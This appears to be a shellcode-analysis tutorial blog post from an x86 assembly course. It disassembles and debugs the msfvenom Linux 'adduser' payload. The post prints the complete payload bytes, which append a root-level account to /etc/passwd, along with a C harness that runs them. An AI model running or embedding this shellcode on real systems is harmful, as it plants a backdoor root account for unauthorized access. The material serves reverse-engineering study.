## Introduction
If we search on internet we will find a lot of ready to use shellcodes of various types, somes are for simple command execution, others adds "secret users" in victim machine, others are bind and reverse shell like the shellcodes wrote in this blog. The question is, shall we trust shellcodes found in internet? Following the general rule "Trust no one" the answer should be a big No, but sometime, for example when we have limited time, we prefer or we are forced to use others shellcode.<br>
In this cases what we suggest is to analyze the downloaed shellcode in sandbox machine before use it, to ensure that it will do what it declare.<br>
For this post we want to show how to analyze 4 samples of shellcodes took from msfvenom payload tool.
We can use the msfvenom tool to list payloads that could be produced:
```bash
root@slae32-lab:# msfvenom -l payloads |grep linux/x86
```

We have already build (and analyzed) the bind and reverse shellcode types so we choosed this 4 shellcode samples:
- linux/x86/adduser "Create a new user with UID 0"
- linux/x86/chmod "Runs chmod on specified file with specified mode"
- linux/x86/exec "Execute an arbitrary command"
- linux/x86/read_file "Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor"<br> 
So let's start our analysis

## Adduser
First thing, we must create the payload with msfvenom
```bash
root@slae32-lab:# msfvenom -p linux/x86/adduser -f C -a x86 --platform linux
No encoder or badchars specified, outputting raw payload
Payload size: 97 bytes
Final size of c file: 433 bytes
unsigned char buf[] = 
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x28\x00\x00\x00\x6d\x65"
"\x74\x61\x73\x70\x6c\x6f\x69\x74\x3a\x41\x7a\x2f\x64\x49\x73"
"\x6a\x34\x70\x34\x49\x52\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a"
"\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58"
"\xcd\x80\x6a\x01\x58\xcd\x80";
```
Now we need to analyze it with ndisasm, using the command 
```bash
echo -ne "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x28\x00\x00\x00\x6d\x65\x74\x61\x73\x70\x6c\x6f\x69\x74\x3a\x41\x7a\x2f\x64\x49\x73\x6a\x34\x70\x34\x49\x52\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -
```
We can see the assembly code 
![](/assets/images/SLAE32/assignment_5/analysis_1.png)<br>
and we can see also the syscalls involved in this payload.
We have to remember that this shellcode has the scope of insert a user with uid 0 in the system so presumibly it write a new well crafted row in /etc/passwd file.
Now let's look at the assembly and try to indentify the syscalls and other components of the shellcode.<br>
![](/assets/images/SLAE32/assignment_5/analysis_2.png)<br>
![](/assets/images/SLAE32/assignment_5/setgid.png)<br>
![](/assets/images/SLAE32/assignment_5/open.png)<br>
![](/assets/images/SLAE32/assignment_5/write.png)<br>
![](/assets/images/SLAE32/assignment_5/exit.png)<br>

So we can resume the syscalls involved in this shellcode:
1. setgid
2. open
3. write
4. exit

Now we can put the shellcode inside our executing C code, compile it and debug it with gdb.<br>
```C
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51
\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63
\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x28\x00\x00\x00\x6d\x65
\x74\x61\x73\x70\x6c\x6f\x69\x74\x3a\x41\x7a\x2f\x64\x49\x73
\x6a\x34\x70\x34\x49\x52\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a
\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58
\xcd\x80\x6a\x01\x58\xcd\x80";

void main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```
### setgid()
The first syscall as said is the ```setgid()``` that want the 0x46 in the EAX register and the gid of the caller as argument, in EBX regsister. In this case the payload set the gid to 0 (root).
![](/assets/images/SLAE32/assignment_5/setgid_0.png)<br>
Now define hook-stop procedure, ```stepi``` to the ```int 0x80``` call and check the first 4 register
<br>
```gdb
Type commands for definition of "hook-stop".
End with a line saying just "end".
>disassemble 
>print/x $eax
>print/x $ebx
>print/x $ecx
>print/x $edx
>end
```

![](/assets/images/SLAE32/assignment_5/setgid_2.png)<br>
![](/assets/images/SLAE32/assignment_5/setgid_3.png)<br>


We have to note two things here. The first is the 3 push dword of the ```open``` syscall that is most certainly the file to open, let's check it.<br>
![](/assets/images/SLAE32/assignment_5/analysis_3.png)<br>

Copy the value 
```
6873737764
682F2F7061
682F657463 
```
and paste it in a converter<br>
![](/assets/images/SLAE32/assignment_5/analysis_4.png)<br>

Well done, we have find the file path opened by ```open``` syscall, it's /etc/passwd, obviously in reverse order beacause we are in little endian and with a double slah to make the number of the letters divisible by 4, so ```dwssap//cte/```.<br>
The second is the chunk of code just after the ```call dword 0x53```, it seems only text instead of assembly instruction and as we will see, this code would never be executed.<br>
